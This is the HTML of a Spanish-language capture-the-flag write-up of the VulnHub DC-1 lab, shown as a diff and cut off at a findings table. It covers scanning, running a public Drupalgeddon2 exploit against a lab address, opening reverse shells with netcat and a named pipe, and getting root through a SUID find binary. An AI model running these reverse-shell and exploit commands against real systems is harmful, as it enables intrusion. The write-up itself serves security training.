@@ -1,0 +1,640 @@
+<!DOCTYPE html>
+<html lang="es" data-color-mode="auto" data-light-theme="light" data-dark-theme="dark">
+<head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>WriteUp: DC1 | VulnHub | MaxisFront</title><meta name="description" content="Esto es solo una prueba"><meta property="og:title" content="WriteUp: DC1 | VulnHub"><meta property="og:description" content="Esto es solo una prueba"><meta property="og:type" content="article"><meta property="og:url" content="https://maxisfront.github.io/es/posts/primer_post/"><meta property="og:image" content="https://maxisfront.github.io/posts/primer_post/swings_omocat.jpg">
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="630"><meta property="og:site_name" content="MaxisFront"><meta property="og:locale" content="es">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="WriteUp: DC1 | VulnHub">
+<meta name="twitter:description" content="Esto es solo una prueba"><meta name="twitter:image" content="https://maxisfront.github.io/posts/primer_post/swings_omocat.jpg">
+<link rel="canonical" href="https://maxisfront.github.io/es/posts/primer_post/">
+
+<link rel="alternate" hreflang="en" href="https://maxisfront.github.io/posts/primer_post/"><link rel="stylesheet" href="/css/primer.min.c12daf26af408c64f29cc993dd5ab422334e71e50fa7198111b729fdf674e34d.css" integrity="sha256-wS2vJq9AjGTynMmT3Vq0IjNOceUPpxmBEbcp/fZ0400=">
+
+<link rel="stylesheet" href="/css/custom.min.44f76475abc99bc3028656bd061d05d398c1b30eefd8ef829d03d0a85e7e5ff2.css" integrity="sha256-RPdkdavJm8MChla9Bh0F05jBsw7v2O&#43;CnQPQqF5&#43;X/I=">
+
+<link rel="stylesheet" href="/css/syntax.min.174c84898cba6753b1e76756faaba89295a9b36f5a52958e027f347103d8575d.css" integrity="sha256-F0yEiYy6Z1Ox52dW&#43;quokpWps29aUpWOAn80cQPYV10=">
+
+
+<link rel="stylesheet" href="/css/custom_properties.min.1d7386ddb782b3f654301f6828a2e1350d69035e6fbcea81181ef7401992198e.css" integrity="sha256-HXOG3beCs/ZUMB9oKKLhNQ1pA15vvOqBGB73QBmSGY4=">
+
+
+<link rel="icon" href="/favicon.ico" type="image/x-icon">
+
+
+<script>
+  (function() {
+    const saved = localStorage.getItem('theme');
+    const html = document.documentElement;
+    if (saved === 'light' || saved === 'dark') {
+      html.setAttribute('data-color-mode', saved);
+    }
+  })();
+</script>
+</head>
+<body>
+  <div class="d-flex flex-column min-height-full"><header class="AppHeader">
+  <div class="AppHeader-globalBar">
+    <div class="AppHeader-globalBar-start">
+      <a href="/es/" class="AppHeader-logo" aria-label="MaxisFront"><span class="AppHeader-logo-text">MaxisFront</span></a>
+
+      <nav class="AppHeader-nav" aria-label="Main navigation"><a href="/es/" class="AppHeader-nav-item">Home</a><a href="/es/posts/" class="AppHeader-nav-item">Posts</a></nav>
+    </div>
+
+    <div class="AppHeader-globalBar-end"><button type="button" id="theme-toggle"
+  class="tooltipped tooltipped-s"
+  aria-label="System theme"
+  data-tooltip-light="Light theme"
+  data-tooltip-dark="Dark theme"
+  data-tooltip-auto="System theme">
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" class="octicon theme-icon-light" style="display: none;">
+    <path d="M8 12a4 4 0 1 1 0-8 4 4 0 0 1 0 8Zm0-1.5a2.5 2.5 0 1 0 0-5 2.5 2.5 0 0 0 0 5Zm5.657-8.157a.75.75 0 0 1 0 1.061l-1.061 1.06a.749.749 0 0 1-1.275-.326.749.749 0 0 1 .215-.734l1.06-1.06a.75.75 0 0 1 1.06 0Zm-9.193 9.193a.75.75 0 0 1 0 1.06l-1.06 1.061a.75.75 0 1 1-1.061-1.06l1.06-1.061a.75.75 0 0 1 1.061 0ZM8 0a.75.75 0 0 1 .75.75v1.5a.75.75 0 0 1-1.5 0V.75A.75.75 0 0 1 8 0ZM3 8a.75.75 0 0 1-.75.75H.75a.75.75 0 0 1 0-1.5h1.5A.75.75 0 0 1 3 8Zm13 0a.75.75 0 0 1-.75.75h-1.5a.75.75 0 0 1 0-1.5h1.5A.75.75 0 0 1 16 8Zm-8 5a.75.75 0 0 1 .75.75v1.5a.75.75 0 0 1-1.5 0v-1.5A.75.75 0 0 1 8 13Zm3.536-1.464a.75.75 0 0 1 1.06 0l1.061 1.06a.75.75 0 0 1-1.06 1.061l-1.061-1.06a.75.75 0 0 1 0-1.061Zm-9.193-9.193a.75.75 0 0 1 1.06 0l1.061 1.06a.75.75 0 0 1-1.06 1.061L2.343 3.403a.75.75 0 0 1 0-1.06Z"></path>
+  </svg>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" class="octicon theme-icon-dark" style="display: none;">
+    <path d="M9.598 1.591a.749.749 0 0 1 .785-.175 7.001 7.001 0 1 1-8.967 8.967.75.75 0 0 1 .961-.96 5.5 5.5 0 0 0 7.046-7.046.75.75 0 0 1 .175-.786Zm1.616 1.945a7 7 0 0 1-7.678 7.678 5.499 5.499 0 1 0 7.678-7.678Z"></path>
+  </svg>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" class="octicon theme-icon-auto" style="display: none;">
+    <path d="M14.25 1c.966 0 1.75.784 1.75 1.75v7.5A1.75 1.75 0 0 1 14.25 12h-3.727c.099 1.041.52 1.872 1.292 2.757A.752.752 0 0 1 11.25 16h-6.5a.75.75 0 0 1-.565-1.243c.772-.885 1.193-1.716 1.292-2.757H1.75A1.75 1.75 0 0 1 0 10.25v-7.5C0 1.784.784 1 1.75 1ZM1.75 2.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h12.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25ZM9.018 13H6.982a5.72 5.72 0 0 1-.765 1.5h3.566a5.72 5.72 0 0 1-.765-1.5Z"></path>
+  </svg>
+</button>
+<details class="dropdown details-reset details-overlay AppHeader-dropdown">
+        <summary class="AppHeader-button" aria-haspopup="true" aria-label="Select language">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16" fill="currentColor">
+            <path d="M8 0a8 8 0 1 1 0 16A8 8 0 0 1 8 0ZM5.78 8.75a9.64 9.64 0 0 0 1.363 4.177c.255.426.542.832.857 1.215.245-.296.551-.705.857-1.215A9.64 9.64 0 0 0 10.22 8.75Zm4.44-1.5a9.64 9.64 0 0 0-1.363-4.177c-.307-.51-.612-.919-.857-1.215a9.927 9.927 0 0 0-.857 1.215A9.64 9.64 0 0 0 5.78 7.25Zm-5.944 1.5H1.543a6.507 6.507 0 0 0 4.666 5.5c-.123-.181-.24-.365-.352-.552-.715-1.192-1.437-2.874-1.581-4.948Zm-2.733-1.5h2.733c.144-2.074.866-3.756 1.58-4.948.12-.197.237-.381.353-.552a6.507 6.507 0 0 0-4.666 5.5Zm10.181 1.5c-.144 2.074-.866 3.756-1.581 4.948-.111.187-.229.371-.352.552a6.507 6.507 0 0 0 4.666-5.5Zm2.733-1.5a6.507 6.507 0 0 0-4.666-5.5c.123.181.241.365.352.552.715 1.192 1.437 2.874 1.581 4.948Z"></path>
+          </svg>
+          <span class="AppHeader-button-text">Español</span>
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="12" height="12" fill="currentColor" class="AppHeader-dropdown-caret">
+            <path d="m4.427 7.427 3.396 3.396a.25.25 0 0 0 .354 0l3.396-3.396A.25.25 0 0 0 11.396 7H4.604a.25.25 0 0 0-.177.427Z"></path>
+          </svg>
+        </summary>
+        <ul class="dropdown-menu dropdown-menu-sw"><li>
+            <a href="/posts/primer_post/" class="dropdown-item" lang="en">English</a>
+          </li><li>
+            <a href="/es/posts/primer_post/" class="dropdown-item selected" lang="es">Español</a>
+          </li></ul>
+      </details></div>
+  </div>
+</header>
+<main class="flex-auto">
+      <div class="container-xl px-3 px-md-4 px-lg-5 py-4"><div class="Layout Layout--sidebarPosition-end Layout--flowRow-until-md">
+          <div class="Layout-main"><article>
+  <header class="mb-4">
+    <h1 class="f1 lh-condensed mb-2">WriteUp: DC1 | VulnHub</h1><div class="d-flex flex-items-center color-fg-muted f5 mb-3"><time datetime="2026-03-01T00:00:00Z">
+        2026-03-01
+      </time><span class="mx-2">&middot;</span><span>12 min read</span><span class="mx-2">&middot;</span><span>MaxFrontis</span></div><div class="d-flex flex-wrap mb-3" style="gap: 0.5rem;"><a href="/es/tags/linux/" class="topic-tag">Linux</a><a href="/es/tags/drupal/" class="topic-tag">Drupal</a><a href="/es/tags/cms/" class="topic-tag">CMS</a><a href="/es/tags/cve-2018-7600/" class="topic-tag">CVE-2018-7600</a><a href="/es/tags/suid/" class="topic-tag">SUID</a><a href="/es/tags/gftobins/" class="topic-tag">GFTOBins</a></div><img src="/posts/primer_post/swings_omocat.jpg" alt="WriteUp: DC1 | VulnHub" loading="lazy" class="rounded-2 width-full mb-3" style="max-height: 400px; object-fit: cover;"></header>
+
+  <div class="markdown-body">
+    
+
+
+
+  
+
+
+<div class="flash mb-3">
+  <blockquote>
+<p>Resumen</p>
+</blockquote>
+<ul>
+<li>Identificación del servicio <code>Drupal 7</code> en el puerto 80.</li>
+<li>Aprovechamiento del <code>CVE-2018-7600</code> para obtener acceso (Drupalgeddon2).</li>
+<li>Explotación de SUID a partir del comando <code>find</code> para escalar a  root.</li>
+<li>Recomendaciones de seguridad para prevenir y mitigar las vulnerabilidades de está máquina.</li>
+</ul>
+</div>
+
+
+
+<h2 id="habilidades-empleadas">Habilidades Empleadas</h2>
+<ul>
+<li>Enumeración de puertos y enumeración de CMS</li>
+<li>Búsqueda y uso de CVEs Críticos</li>
+<li>Uso de comandos básicos basados en GNU/Linux</li>
+<li>Aprovechamiento de SUID vulnerables</li>
+</ul>
+<h2 id="herramientas-utilizadas">Herramientas Utilizadas</h2>
+<ul>
+<li>arp-scan</li>
+<li>ping</li>
+<li>nmap</li>
+<li>python3</li>
+<li>nc</li>
+<li>find (SUID)</li>
+</ul>
+<hr>
+<h1 id="recolección-de-información">Recolección de Información</h1>
+<p>Primeramente analizamos nuestra red local a través del comando <code>arp-scan</code>, especificando nuestra interfaz de red. El comando utilizado fue este:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code data-lang="bash"><span style="display:flex;"><span>arp-scan -I eth3 -l</span></span></code></pre></div><ul>
+<li><code>arp-scan: Permite identificar equipos conectados a la misma red que el host</code></li>
+<li><code>-I interface: Especificamos la interfaz de red donde se enviarán solicitudes para identificar dispositivos</code></li>
+<li><code>-l: Descubrimiento de dispositivos en nuestra subred local (--localnet) </code></li>
+</ul>
+<img src="./images/20260306192120.png" alt="Identifying the IP" loading="lazy">
+<p>La dirección IP de interés es la <code>192.168.1.169</code>. Realizamos una prueba de conectividad a través de <code>ping</code> para verificar que es posible entablar una conexión entre la máquina objetivo y la nuestra.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code data-lang="bash"><span style="display:flex;"><span>ping -c1 192.168.1.169 -R</span></span></code></pre></div><ul>
+<li><code>ping: Envía un paquete ICMP para verificar si un equipo está activo</code></li>
+<li><code>-c1: Especificamos que solo se envíe un paquete y se espere a recibirlo</code></li>
+<li><code>-R: Solicitamos que se trace la ruta del paquete para observar si hay conexión directa o el paquete pasa por nodos durante el proceso (Los cuales pueden reducir el valor del TTL)</code></li>
+</ul>
+<img src="./images/20260306195718.png" alt="Testing the connection with the victim" loading="lazy">
+<p>Podemos observar que la ruta de nuestra traza ICMP indica una conexión exitosa. Por otro lado, un valor del TTL cercano a  <code>64</code> suele implicar que nos enfrentamos a un OS <code>Linux/Unix</code> (Aunque esto no es una identificación definitiva).</p>
+<hr>
+<h1 id="enumeración-de-puertos">Enumeración de Puertos</h1>
+<p>Enumeramos los <code>65535</code> puertos del sistema a través de la herramienta <code>Nmap</code> (Network Mapper) para intentar identificar puertos TCP abiertos:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code data-lang="bash"><span style="display:flex;"><span>nmap -p- --min-rate <span style="color:#bd93f9">5000</span> -Pn -n -oN nmap-scan 192.168.1.169</span></span></code></pre></div><ul>
+<li><code>-p-: Nmap escanea los 65535 puertos TCP de un host.</code></li>
+<li><code>--min-rate: Se envían como mínimo X cantidad de paquetes por segundo</code></li>
+<li><code>-Pn: (No Ping) Omite el descubrimiento de host mediante _ping_, asumiendo que todos los puertos indicados están activos.</code></li>
+<li><code>-n: (No DNS resolution) Se omite la resolución DNS inversa (De esta manera no pierde tiempo solicitando al servidor DNS el nombre de la dirección IP 192.168.1.169)</code></li>
+<li><code>-oN archivo_nombre: Exportamos el output de Nmap casi tal cual como nos lo muestra en la terminal</code></li>
+</ul>
+<blockquote>
+<p>&lt;= Importante =&gt;
+En entornos empresariales se desaconseja una enumeración agresiva, puesto que enviar paquetes <code>tcp, icmp y/o udp</code> en grandes cantidades (<code>5000</code>, por ejemplo) puede provocar que sistemas de monitorización identifiquen el escaneo rápidamente  y nos bloqueen.</p>
+<p>Por otro lado, si los sistemas no soportan la recepción de grandes cantidades de paquetes, estos podrían saturar los sistemas temporalmente o el mismo escaneo podría dar falsos positivos/negativos.</p>
+</blockquote>
+<img src="./images/20260307102017.png" alt="Nmap Scan" loading="lazy">
+<p>Observamos los puertos <code>22 (ssh), 80 (http), 111 (rpcbind) y el 57182 (Desconocido actualmente)</code>. Ahora, podemos centrar la enumeración en estos puertos utilizando la flag <code>-sV</code>, donde <code>Nmap</code> - tras haber entablado una comunicación con un puerto - analice las respuestas para determinar la versión del servicio que hay detrás.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code data-lang="bash"><span style="display:flex;"><span>nmap -sV -p22,80,111,57182 -oN ports-enumeration 192.168.1.169</span></span></code></pre></div><img src="./images/20260307103608.png" alt="First port enumeration with -sV flag" loading="lazy">
+<p>El resultado del escaneo ahora nos expone el apartado <code>VERSION</code>. A pesar de contener datos valiosos, es posible mejorar la calidad de estos a través de la flag <code>-sC</code>, gracias a la cual <code>Nmap</code> utilizará un conjunto predeterminado de <code>scripts de reconocimiento</code> para recabar aún más información:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code data-lang="bash"><span style="display:flex;"><span>nmap -p22,80,111,57182 -sCV -oN ports-enumeration 192.168.1.169</span></span></code></pre></div><blockquote>
+<p>Es posible concatenar las flags <code>-sV y -sC</code>, resultando en <code>-sCV</code>.</p>
+</blockquote>
+<img src="./images/20260307103859.png" alt="Second port enumeration with -sCV flag" loading="lazy">
+<p>Tras un análisis de la enumeración de puertos, podemos agrupar los resultados en la siguiente tabla:</p>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: center">Puerto</th>
+          <th style="text-align: center">Servicio</th>
+          <th style="text-align: center">Versión</th>
+          <th style="text-align: center">Notas</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: center">22</td>
+          <td style="text-align: center">ssh</td>
+          <td style="text-align: center">OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)</td>
+          <td style="text-align: center">Versión desactualizada propensa al <strong>CVE-2016-6210</strong> y al <strong>CVE-2015-5600</strong>, aunque para esta máquina <code>el servicio no es el principal objetivo a explotar</code></td>
+      </tr>
+      <tr>
+          <td style="text-align: center">80</td>
+          <td style="text-align: center">http</td>
+          <td style="text-align: center">Apache httpd 2.2.22 ((Debian))</td>
+          <td style="text-align: center">Sus encabezados nos delatan que estamos en frente de una distribución de <code>Debian</code> y un CMS con una versión interesante: <code>Drupal 7 - Propenso a la vulnerabilidad</code> <strong>Drupalgeddon2</strong></td>
+      </tr>
+      <tr>
+          <td style="text-align: center">111</td>
+          <td style="text-align: center">rpcbind</td>
+          <td style="text-align: center">rpcbind 2-4 (RPC #100000)</td>
+          <td style="text-align: center">Servicio estándar en Sistemas Unix sin información que exponga alguna vulnerabilidad</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">57182</td>
+          <td style="text-align: center">status</td>
+          <td style="text-align: center">1 (RPC #100024)</td>
+          <td style="text-align: center">Servicio secundario derivado de rpcbind</td>
+      </tr>
+      <tr>
+          <td style="text-align: center"></td>
+          <td style="text-align: center"></td>
+          <td style="text-align: center"></td>
+          <td style="text-align: center"></td>
+      </tr>
+  </tbody>
+</table>
+<blockquote>
+<p>Herramientas como <code>whatweb</code> (Comando) o <code>Wappalyzer</code> (Extensión del navegador) son de gran utilidad cuando deseamos conocer únicamente las tecnologías que hay en un servicio http.</p>
+</blockquote>
+<p>A partir de la tabla podemos definir posibles vectores de ataques:</p>
+<blockquote>
+<ul>
+<li>
+<p>Puerto 22 (SSH): La versión de este servicio podría ser explotada a través 2 CVEs, así como aplicar ataques de fuerza bruta por diccionarios (<code>rockyou.txt</code>, por ejemplo), aunque estos se omitirán debido a un vector de ataque más prometedor.</p>
+</li>
+<li>
+<p>Puerto 80 (http): El Content Management System (<code>CMS</code>) utilizado es <code>Drupal 7</code>, comúnmente atacado &ldquo;<em>in the wild</em>&rdquo; a través de su vulnerabilidad más conocida: <code>Drupalgeddon 2</code>. Esta vulnerabilidad permite al atacante ejecutar comandos remotos debido a una falla en el <code>Drupal Form API</code>.</p>
+</li>
+</ul>
+</blockquote>
+<h1 id="enumeración-web">Enumeración Web</h1>
+<p>En el puerto 80 se está ejecutando un servicio <code>http</code>, el cual tras visitarlo nos indica que - como ya se ha comentado - hace uso del CMS &ldquo;<code>Drupal 7</code>&rdquo;:</p>
+<img src="./images/20260307120546.png" alt="Home of the Drupal 7 web page" loading="lazy">
+<blockquote>
+<p>En entornos de pentesting web es buena idea probar credenciales comunes, tales como <code>admin:admon</code> o <code>user:password</code>. Esto suele ser frecuente en sistemas antiguos y con mantenimiento irregular.</p>
+</blockquote>
+<p>A pesar de que el sistema web sea antiguo, no posee credenciales comunes.  A pesar de ello, hay otro campo de interés: <code>Create new account</code>:</p>
+<img src="./images/20260307121144.png" alt="Identifying the admin account" loading="lazy">
+<p>Observamos que <code>Drupal 7</code> nos indica que &ldquo;<code>The name admin is already taken</code>&rdquo;. Esto nos podría ser de utilidad para probar nuevamente claves comunes, pero no es el caso. Por lo tanto, seguiremos con la enumeración de la página web.</p>
+<p>Una dirección de gran valor suele ser <code>/robots.txt</code>, puesto que le indica a los <code>web crawlers y spiders</code> de los buscadores evitar indexar determinadas urls en sus resultados; al buscar dentro de este observamos direcciones como <code>/admin</code>, pero sucede lo mismo que en el anterior intento. <em>Acceso denegado</em>.</p>
+<p>Tras observar que no hay más puntos de los cuales obtener información, podemos pasar al análisis de la vulnerabilidad de <code>Drupal 7</code>.</p>
+<h2 id="sa-core-2018-002--cve-2018-7600">SA-Core-2018-002 | CVE-2018-7600</h2>
+<p>Una búsqueda rápida nos arroja que la versión más actual del CMS que tenemos frente a nosotros es <code>Drupal 11</code> (Acorde a la fecha en que se redactó esto), el cual fue lanzado en <strong>2024</strong>. En cambio, <code>Drupal 7</code> fue lanzado el <strong>5 de enero del 2011</strong></p>
+<p>El anterior punto nos puede dar paso al siguiente razonamiento: Conforme pasan los años,  se suelen descubrir vulnerabilidades críticas en versiones de sistemas reconocidos (Como un <code>Drupal</code>).</p>
+<p>Por lo tanto, al ser <em><code>Drupal 7</code></em> una versión antigua, probablemente tenga algún número importante de vulnerabilidades.</p>
+<p>Una búsqueda rápida en Google nos arroja lo siguiente:</p>
+<img src="./images/20260307122506.png" alt="Gathering information about the SA-Core-2018-002 Vulnerability" loading="lazy">
+<p><a href="https://www.drupal.org/sa-core-2018-002">Drupal - SA-Core-2018-002</a></p>
+<blockquote>
+<p>Es común que diversas vulnerabilidades tengan alguna PoC (<code>Proof of Concept</code>) por Internet, o inclusive exploits hechos por la comunidad para su uso en entornos controlados.</p>
+</blockquote>
+<p>Esta vulnerabilidad (Conocida comúnmente como <code>Drupalgeddon 2</code>) se aprovecha de una vulnerabilidad del <code>Drupal Form API</code>, donde el CMS interpreta y ejecuta  comandos remotos a partir de solicitudes de tipo <code>GET</code> o <code>POST</code>, esto mediante la manipulación de campos que utilizan el prefijo #.</p>
+<hr>
+<h1 id="explotación">Explotación</h1>
+<p>Una búsqueda en profundidad del <code>CVE-2018-7600</code> nos lleva finalmente a un repositorio con un exploit que se aprovecha de esta vulnerabilidad:</p>
+<p>Una búsqueda específica sobre la vulnerabilidad  nos lleva a un repositorio de <code>GitHub</code> que se aprovecha del <code>hecho por el usuario</code>pimps` :</p>
+<p><a href="https://github.com/pimps/CVE-2018-7600/blob/master/drupa7-CVE-2018-7600.py">Drupal 7 (CVE-2018-7600 / SA-CORE-2018-002)</a></p>
+<blockquote>
+<p>Créditos al usuario <code>pimps</code> (<a href="https://github.com/pimps">Perfil de GitHub</a>)</p>
+</blockquote>
+<p>Tras haber descargado el exploit, podemos ejecutar la siguiente línea de comandos para aplicar un <code>RCE</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code data-lang="bash"><span style="display:flex;"><span>python3 drupa7-CVE-2018-7600.py -c <span style="color:#f1fa8c">&#39;whoami&#39;</span> http://192.168.1.169/</span></span></code></pre></div><img src="./images/20260307134239.png" alt="Using the CVE-2018-7600 python exploit to get access" loading="lazy">
+<p>De esta manera comprobamos que tenemos capacidad de ejecución de código remoto. Por lo tanto, para eficientar el proceso de explotación y escalada de privilegios, entablaremos una reverse shell:</p>
+<h2 id="creación-de-una-reverse-shell">Creación de una Reverse Shell</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code data-lang="bash"><span style="display:flex;"><span>&gt; Máquina Atacante
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>nc -lvnp <span style="color:#bd93f9">4444</span></span></span></code></pre></div><ul>
+<li><code>nc: Permite crear un sistema Cliente/Servidor para entablar una conexión (Útil para crear una reverse shell).</code></li>
+<li><code>-lvnp 4444: Especificamos a nc que entre en modo escucha, sea de tipo verbose (Dé más detalles), no realice resolución DNS (Usando así una IP directamente y reduciendo tiempos de espera) y permita especificar un puerto para conexiones entrantes (El 4444 para nuestro caso).</code></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code data-lang="bash"><span style="display:flex;"><span>python3 drupa7-CVE-2018-7600.py -c <span style="color:#f1fa8c">&#39;nc -e /bin/bash $IP 4444&#39;</span> http://192.168.1.169/</span></span></code></pre></div><blockquote>
+<p>&lt;= Aclaración =&gt;
+En equipos actuales, la flag <code>-e</code> no está disponible por razones de seguridad.</p>
+<p>A pesar de ello, es posible entablar una reverse shell a través de <code>Named Pipes</code>: <code>rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc $IP 4444 &gt; /tmp/f</code>.</p>
+</blockquote>
+<img src="./images/20260307135039.png" alt="Listing the /var/www/hmtl content" loading="lazy">
+<p>Listamos el contenido del directorio actual de trabajo. ¡Perfecto! Solo hay un pequeño detalle: Nuestra reverse shell no es interactiva. Comandos como <code>CTRL + C</code> nos cerrarán la consola, por decir un ejemplo.</p>
+<p>Por ello, modificamos la tty para que sea completamente interactiva.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code data-lang="bash"><span style="display:flex;"><span>script /dev/null -c bash <span style="color:#6272a4"># Presionamos CTRL + Z después de esto</span>
+</span></span><span style="display:flex;"><span>stty raw -echo; <span style="color:#8be9fd;font-style:italic">fg</span>
+</span></span><span style="display:flex;"><span>reset xterm
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">export</span> <span style="color:#8be9fd;font-style:italic">TERM</span><span style="color:#ff79c6">=</span>xterm</span></span></code></pre></div><ul>
+<li><code>script /dev/null -c bash: Este comando le indica al sistema grabar lo que sucede en una sesión de terminal, descartando el registro (log) del comando script.</code></li>
+<li><code>CTRL + Z: Suspende temporalmente la reverse shell.</code></li>
+<li><code>stty raw -echo; fg: Permite enviar carácteres crudos a la terminal (Permitiendo comandos como CTRL + C), así como que evita duplicar el input. Por último, fg (foreground) retorna a primer plano la shell previamente suspendida.</code></li>
+<li><code>reset xterm: Reinicia los parámetros de control de la terminal, limpiando la pantalla y arreglando el cursor.</code></li>
+<li><code>export TERM=xterm: Le indica al sistema remoto nuestro tipo de terminal, permitiendo así renderizar interfaces visuales (Como Vim o Nano)</code></li>
+</ul>
+<p>Ahora ya tenemos una <code>shell completamente interactiva</code>:</p>
+<img src="./images/20260307135813.png" alt="Interactive Reverse Shell established" loading="lazy">
+<h1 id="escalada-de-privilegios">Escalada de Privilegios</h1>
+<p>Para realizar la escalada de privilegios, podemos buscar binarios con permisos SUID, los cuales son comúnmente asignados para ejecutar binarios con permisos de administrador sin necesidad de que el usuario esté en el grupo sudoers.</p>
+<p>Una manera de buscarlos, es la siguiente:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code data-lang="bash"><span style="display:flex;"><span>find / -perm -4000 -user root 2&gt;/dev/null</span></span></code></pre></div><ul>
+<li><code>find: Utilidad capaz de buscar en el sistema elementos con características específicas.</code></li>
+<li><code>/: Buscamos desde el directorio raíz</code></li>
+<li><code>-perm -4000: Buscamos archivos con permisos SUID (Set User ID)</code></li>
+<li><code>-user root: Especificamos que los archivos deben de pertenecerle al usuario root</code></li>
+<li><code>2&gt;/dev/null: Redigirimos los errores a /dev/null para ocultarlos y solo enfocarnos en las respuestas válidas</code></li>
+</ul>
+<img src="./images/20260307141326.png" alt="Identifying the find binary with the SUID bit" loading="lazy">
+<h2 id="find-aprovechamiento-del-suid">Find: Aprovechamiento del SUID</h2>
+<p>Dentro de todas las respuestas, es posible observar un SUID crítico: <code>/usr/bin/find</code>. Si buscamos en GFTOBins, vemos un comando crucial:</p>
+<img src="./images/20260307142638.png" alt="Using GFTOBins to get root privileges" loading="lazy">
+<p>El <code>SUID</code> del binario <code>find</code> nos permite <code>ejecutar el intérprete de comandos (sh)</code> a través del siguiente comando:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code data-lang="bash"><span style="display:flex;"><span>find . -exec /bin/sh <span style="color:#f1fa8c">\;</span> -quit</span></span></code></pre></div><ul>
+<li><code>-exec: Permite la ejecución de comandos, y termina cuando llega hasta un &quot;;&quot;</code></li>
+<li><code>\; Le indica a &quot;find&quot; hasta dónde terminan los argumentos de la flag &quot;-exec&quot;, pero permitiendo ejecutar otros comandos luego del cierre (La barra invertida evita que la terminal lo interpréte y el comando &quot;find&quot; quede a medias)</code></li>
+<li><code>-quit: Le especifica al comando &quot;find&quot; que termine la ejecución a la primera coincidencia</code></li>
+</ul>
+<blockquote>
+<p>Es relevante destacar que el bit <code>SUID</code> en el comando <code>find</code> permite ejecutar los comandos posteriores (Como /bin/sh) con los privilegios del dueño del archivo, es decir, <em><code>root</code></em>.</p>
+</blockquote>
+<img src="./images/20260307141718.png" alt="Finally getting root privileges" loading="lazy">
+<p>Tenemos permisos de administrador! Para la última comprobación, podemos intentar leer la flag que se encuentra en el directorio <code>/root</code>:</p>
+<blockquote>
+<p>Well done!!!!</p>
+<p>Hopefully you&rsquo;ve enjoyed this and learned some new skills.</p>
+<p>You can let me know what you thought of this little journey
+by contacting me via Twitter - @DCAU7</p>
+</blockquote>
+<h2 id="impacto">Impacto</h2>
+<p>El atacante con permisos de administrador obtiene las capacidades de:</p>
+<blockquote>
+<ul>
+<li>Modificación de archivos del sistema.</li>
+<li>Acceso a la base de datos de Drupal 7, permitiendo modificar las contraseñas de usuarios y robo de datos sensibles.</li>
+<li>Entablar persistencia entre sesiones futuras.</li>
+<li>Capacidad de movimiento lateral hacia otros sistemas de la red.</li>
+</ul>
+</blockquote>
+<hr>
+<h1 id="resumen">Resumen</h1>
+<p>La máquina DC-1 presentó una serie de vulnerabilidades críticas (<strong><em>No todas expuestas en esta redacción</em></strong>) que permitieron técnicas como <code>RCE</code>, capacidad de entablar una <code>revere shell</code>,o credenciales débiles para el servicio <code>SSH</code>, por lo que a continuación se expondrán algunas pautas para evitar esta clase de fallos de seguridad.</p>
+<h2 id="descubrimientos">Descubrimientos</h2>
+<blockquote>
+<p>Drupalgeddon2</p>
+</blockquote>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: center">ID</th>
+          <th style="text-align: center"><strong>Vulnerabilidad</strong></th>
+          <th style="text-align: center"><strong>Gravedad</strong></th>
+          <th style="text-align: center">Descripción</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: center">MF1</td>
+          <td style="text-align: center">Ejecución de Código Arbitrario (RCE)</td>
